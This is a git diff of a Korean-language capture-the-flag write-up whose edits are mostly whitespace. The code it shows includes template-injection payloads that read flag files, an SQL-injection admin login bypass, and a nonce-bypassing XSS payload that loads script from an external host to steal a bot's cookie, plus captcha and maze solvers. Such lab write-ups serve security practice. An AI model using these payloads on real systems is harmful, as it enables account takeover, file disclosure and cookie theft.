@@ -105,13 +105,13 @@ mutation {
   }
 }`
 const response3 = await fetch('/graphql', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        query: book_content_query
-    })
+	method: 'POST',
+	headers: {
+		'Content-Type': 'application/json'
+	},
+	body: JSON.stringify({
+		query: book_content_query
+	})
 })
 ```
 
@@ -205,27 +205,27 @@ html := `<!DOCTYPE html>
 import { create } from './utils/'
 
 const r = create({
-    baseURL: 'http://hackbox.kospo.co.kr:20002'
+	baseURL: 'http://hackbox.kospo.co.kr:20002'
 })
 
 for (let i of 'abcdef01234') {
-    console.info(i)
-    for (let j of 'abcdef01234') {
-        for (let k of 'abcdef01234') {
-            for (let l of 'abcdef01234') {
-                const res = await r.get('/', {
-                    params: {
-                        name: `{{getDate "cat" "/flag${i}${j}${k}${l}"}}`
-                    }
-                })
-                console.log(res.data.split('<h1>')[1].split('</h1>')[0].trim())
-                if (!res.data.includes('No')) {
-                    console.log(res.data)
-                    process.exit(0)
-                }
-            }
-        }
-    }
+	console.info(i)
+	for (let j of 'abcdef01234') {
+		for (let k of 'abcdef01234') {
+			for (let l of 'abcdef01234') {
+				const res = await r.get('/', {
+					params: {
+						name: `{{getDate "cat" "/flag${i}${j}${k}${l}"}}`
+					}
+				})
+				console.log(res.data.split('<h1>')[1].split('</h1>')[0].trim())
+				if (!res.data.includes('No')) {
+					console.log(res.data)
+					process.exit(0)
+				}
+			}
+		}
+	}
 }
 ```
 
@@ -235,24 +235,25 @@ for (let i of 'abcdef01234') {
 import { create } from './utils/'
 
 const r = create({
-    baseURL: 'http://hackbox.kospo.co.kr:20002'
+	baseURL: 'http://hackbox.kospo.co.kr:20002'
 })
 
 const res = await r.get('/', {
-    params: {
-        name: `{{getDate "curl" "file:///flag{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}"}}`
-    }
+	params: {
+		name: `{{getDate "curl" "file:///flag{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}{a,b,c,d,e,f,0,1,2,3,4}"}}`
+	}
 })
 console.log(res.data.split('<h1>')[1].split('</h1>')[0].trim())
 ```
 
 **flag{SS1t_w1TH_Go14ng!!!}**
 
-
 ### kospo_board(1000 points, 5 solves)
+
 문제 파일을 열었을때, 코드가 너무 난잡해서 나중에 풀었던 문제이다.
 내가 좋아하는 **nodejs**로 작성된 서버이다!!
 일단, **flag**는 봇의 **cookie**에 존재한다. 먼저, **flag**을 얻기 위한 **board**가 어떻게 작동하는 알아보자.
+
 ```javascript
 router.post('/new', (req, res, next) => {
 	let page_uuid = uuid.v4()
@@ -335,13 +336,16 @@ router.get('/view/:uuid', (req, res, next) => {
 	})
 })
 ```
+
 딱 보자마자, **nonce**를 얻어야 한다는 것을 알 수 있다.
 여기서 **nonce**를 얻는 방법이 두가지가 있다.
+
 1. **css injection**을 통한 **nonce leak** (csp를 보면 이게 인텐인 것 같기도 하다.)
 2. 계정 로그인 관련 취약점을 통한 **nonce leak**
-난 2번 방법을 사용해 **nonce**를 얻었다.
-**auth** 관련 코드를 보면, id와 pw의 타입 검증 없이 그대로 바인딩하고 있는 것을 알 수 있다.
-이는, **sql injection**이 가능해진다.
+   난 2번 방법을 사용해 **nonce**를 얻었다.
+   **auth** 관련 코드를 보면, id와 pw의 타입 검증 없이 그대로 바인딩하고 있는 것을 알 수 있다.
+   이는, **sql injection**이 가능해진다.
+
 ```javascript
 passport.use(
 	new Strategy(function (req, cb) {
@@ -370,7 +374,9 @@ passport.use(
 	})
 )
 ```
+
 **username**에는 **admin**을 넣고, **password**는 객체로 전달해주면 된다.
+
 ```typescript
 import { create } from './utils/'
 const r = create({
@@ -392,10 +398,12 @@ await r
 	)
 	.then((res) => console.info(res.headers, res.status))
 ```
+
 그러면, **admin** 계정을 탈취할 수 있고, **nonce**를 얻을 수 있다.
 참고로, **nonce** 값은 **cf833634-6991-47b9-8f85-9ba91c8a1a44**이다.
 이제, **xss**를 통해 **flag**을 얻어야 한다.
 먼저 **script**를 제공해줄 서버를 준비해야 한다.
+
 ```typescript
 import express from 'express'
 const app = express()
@@ -408,6 +416,7 @@ app.listen(3000, '0.0.0.0', () => {
 	console.log('Server started on http://0.0.0.0:3000')
 })
 ```
+
 그리고, <strong> &lt;script src='https://h.bmcyver.dev' nonce='cf833634-6991-47b9-8f85-9ba91c8a1a44'&gt;&lt;/script&gt; </strong>를 **content**에 넣고 **post**하면 된다.
 ![img2](img2.png)
 **flag{471c6236d52f164df2b5ff324bb351ee6935715d9a102a386022430b220f8072vxxwcj1zzg}**
@@ -428,108 +437,108 @@ import * as cheerio from 'cheerio'
 import { create } from './utils/'
 
 const axios = create({
-    baseURL: 'http://hackbox.kospo.co.kr:16667'
+	baseURL: 'http://hackbox.kospo.co.kr:16667'
 })
 
 async function shortestPath(grid: string[][]): Promise<number> {
-    const directions: number[][] = [
-        [0, 1], // right
-        [1, 0], // down
-        [0, -1], // left
-        [-1, 0] // up
-    ]
+	const directions: number[][] = [
+		[0, 1], // right
+		[1, 0], // down
+		[0, -1], // left
+		[-1, 0] // up
+	]
 
-    const rows: number = grid.length
-    const cols: number = grid[0].length
+	const rows: number = grid.length
+	const cols: number = grid[0].length
 
-    let start: number[] | null = null
-    let end: number[] | null = null
+	let start: number[] | null = null
+	let end: number[] | null = null
 
-    // Find start and end points
-    for (let i = 0; i < rows; i++) {
-        for (let j = 0; j < cols; j++) {
-            if (grid[i][j] === '@') {
-                start = [i, j]
-            } else if (grid[i][j] === '#') {
-                end = [i, j]
-            }
-        }
-    }
+	// Find start and end points
+	for (let i = 0; i < rows; i++) {
+		for (let j = 0; j < cols; j++) {
+			if (grid[i][j] === '@') {
+				start = [i, j]
+			} else if (grid[i][j] === '#') {
+				end = [i, j]
+			}
+		}
+	}
 
-    if (!start || !end) return -1
+	if (!start || !end) return -1
 
-    const queue: Array<[number, number, number]> = [[start[0], start[1], 0]]
-    const visited: Set<string> = new Set()
-    visited.add(start[0] + ',' + start[1])
+	const queue: Array<[number, number, number]> = [[start[0], start[1], 0]]
+	const visited: Set<string> = new Set()
+	visited.add(start[0] + ',' + start[1])
 
-    while (queue.length > 0) {
-        const [x, y, distance] = queue.shift()!
+	while (queue.length > 0) {
+		const [x, y, distance] = queue.shift()!
 
-        if (x === end[0] && y === end[1]) {
-            return distance
-        }
+		if (x === end[0] && y === end[1]) {
+			return distance
+		}
 
-        for (const [dx, dy] of directions) {
-            const newX = x + dx
-            const newY = y + dy
+		for (const [dx, dy] of directions) {
+			const newX = x + dx
+			const newY = y + dy
 
-            if (
-                newX >= 0 &&
-                newX < rows &&
-                newY >= 0 &&
-                newY < cols &&
-                grid[newX][newY] !== '1' &&
-                !visited.has(newX + ',' + newY)
-            ) {
-                visited.add(newX + ',' + newY)
-                queue.push([newX, newY, distance + 1])
-            }
-        }
-    }
-    return -1
+			if (
+				newX >= 0 &&
+				newX < rows &&
+				newY >= 0 &&
+				newY < cols &&
+				grid[newX][newY] !== '1' &&
+				!visited.has(newX + ',' + newY)
+			) {
+				visited.add(newX + ',' + newY)
+				queue.push([newX, newY, distance + 1])
+			}
+		}
+	}
+	return -1
 }
 let step_1 = 1
 
 async function parseMaze(): Promise<void> {
-    const { data } = await axios.get('/stage')
-    const $ = cheerio.load(data)
+	const { data } = await axios.get('/stage')
+	const $ = cheerio.load(data)
 
-    const cells = $('.maze .cell')
-    const grid: string[][] = []
-    let rows: number = 10 + step_1
-    let cols: number = 10 + step_1
-    if (rows > 30) {
-        rows = 30
-        cols = 30
-    }
-    console.info(cells.length)
-    for (let i = 0; i < rows; i++) {
-        const row: string[] = []
-        for (let j = 0; j < cols; j++) {
-            const cell = $(cells[i * cols + j])
-            if (cell.hasClass('wall')) {
-                row.push('1')
-            } else if (cell.hasClass('start')) {
-                row.push('@')
-            } else if (cell.hasClass('end')) {
-                row.push('#')
-            } else {
-                row.push('0')
-            }
-        }
-        grid.push(row)
-    }
+	const cells = $('.maze .cell')
+	const grid: string[][] = []
+	let rows: number = 10 + step_1
+	let cols: number = 10 + step_1
+	if (rows > 30) {
+		rows = 30
+		cols = 30
+	}
+	console.info(cells.length)
+	for (let i = 0; i < rows; i++) {
+		const row: string[] = []
+		for (let j = 0; j < cols; j++) {
+			const cell = $(cells[i * cols + j])
+			if (cell.hasClass('wall')) {
+				row.push('1')
+			} else if (cell.hasClass('start')) {
+				row.push('@')
+			} else if (cell.hasClass('end')) {
+				row.push('#')
+			} else {
+				row.push('0')
+			}
+		}
+		grid.push(row)
+	}
 
-    const step: number = await shortestPath(grid)
-    console.info('최단 경로:', step)
-    await axios.postForm('/stage', { steps: step }).then(async (res) => {
-        console.info(res.data)
-        if (res.data.includes('통과')) {
-            console.info('통과', step_1)
-            step_1++
-            await parseMaze()
-        }
-    })
+	const step: number = await shortestPath(grid)
+	console.info('최단 경로:', step)
+	await axios.postForm('/stage', { steps: step }).then(async (res) => {
+		console.info(res.data)
+		if (res.data.includes('통과')) {
+			console.info('통과', step_1)
+			step_1++
+			await parseMaze()
+		}
+	})
 }
 
 parseMaze()
@@ -549,45 +558,45 @@ parseMaze()
 import { create } from './utils/'
 
 const r = create({
-    baseURL: 'http://hackbox.kospo.co.kr:14447'
+	baseURL: 'http://hackbox.kospo.co.kr:14447'
 })
 
 const decoder = () =>
-    JSON.parse(Buffer.from(r.getCookie('session')?.split('.')[0]!, 'base64').toString())
+	JSON.parse(Buffer.from(r.getCookie('session')?.split('.')[0]!, 'base64').toString())
 
 await r.get('/', {
-    maxRedirects: 0,
-    validateStatus: (status) => status === 302
+	maxRedirects: 0,
+	validateStatus: (status) => status === 302
 })
 
 await r.get('/captcha', {
-    maxRedirects: 0
+	maxRedirects: 0
 })
 
 for (let i = 0; i < 31; i++) {
-    const data = decoder()
-    console.log(data)
-    await r
-        .postForm(
-            '/submit',
-            {
-                captcha: data.captcha_text
-            },
-            {
-                maxRedirects: 0,
-                validateStatus: (status) => status === 302
-            }
-        )
-        .then((res) => {
-            console.info(res.data)
-        })
-    await r
-        .get('/captcha', {
-            maxRedirects: 0
-        })
-        .then((res) => {
-            console.info(res.data)
-        })
+	const data = decoder()
+	console.log(data)
+	await r
+		.postForm(
+			'/submit',
+			{
+				captcha: data.captcha_text
+			},
+			{
+				maxRedirects: 0,
+				validateStatus: (status) => status === 302
+			}
+		)
+		.then((res) => {
+			console.info(res.data)
+		})
+	await r
+		.get('/captcha', {
+			maxRedirects: 0
+		})
+		.then((res) => {
+			console.info(res.data)
+		})
 }
 ```
 
